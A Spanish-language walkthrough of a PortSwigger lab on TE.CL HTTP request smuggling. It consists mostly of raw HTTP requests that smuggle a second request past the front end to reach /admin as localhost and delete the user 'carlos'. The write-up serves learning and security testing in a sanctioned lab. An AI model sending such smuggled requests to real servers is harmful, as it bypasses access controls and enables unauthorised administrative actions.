Este es Portswigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

Primero veo las respuestas del servidor
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
Dando como resultado:
Server Error: Communication timed out: sent = true, receivedEmptyResponse = true, timedOut = true
lo cual es una fuerte indicacion de que el front-end está pririzando el Transfer-Encoding.  Entonces tenemos que usar chunked para el fronted. Para eso tenemos que asegurarnos que el front-end mande toda la request al back-end. Envíamos la confirmación para evitar falsos positivos (es importante el CRLF vacío indicando que no viene más nada):
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

14
GET /asda HTTP/1.1

0

 
```
Llamamos a una página que no existe, sin embargo la solicitud no nos dice nada, nos da un error 400.
Por qué?
La solicitud se envía completa, y el backend ve esto:
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

14
```
Porque esta priorizando el content length, 14+CRLF (~14 \r\n~), y la solicitud que queda pendiente es esta
```
GET /asda HTTP/1.1

0

```
Lo cual no es válido, porque el cuerpo requiere un Content-length, o Transfer-Encoding, así el servidor sabe cuando empiezay etermina el body de la request. 
Así que enviamos la siguinete request
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

27
GET /asda HTTP/1.1
Content-Length: 6

0


```
La cual da un 200 OK, pero la segunda request tira un 404 not found
Así que ahora buscamos por la url de admin, incluyendo el Host: localhost, qe esta manera aceptara la solicitud:
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

39
GET /admin HTTP/1.1
Content-Length: 6
Host: localhost

0


```
con 6 bytes en vez de cinco, para que de esta manera se concatenen las solicitudes. Tal vez te preguntes, Porque no la resolvimos como cuando era CL.TE:
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

39
GET /admin HTTP/1.1
Content-Length: 3
Host: localhost

x: 
```
Esto causarí un time out, porque si el front-end usa el transfer encoding no ve el final a esto, necesita de un 0 que diga que la solicitud llego a su final.
De esta manera podremos borrar al usuario Carlos:
```
POST / HTTP/1.1
Host: 0aa800bd04ace6a481ec8fd4006800fd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

50
GET /admin/delete?username=carlos HTTP/1.1
Content-Length: 6
Host: localhost

0


```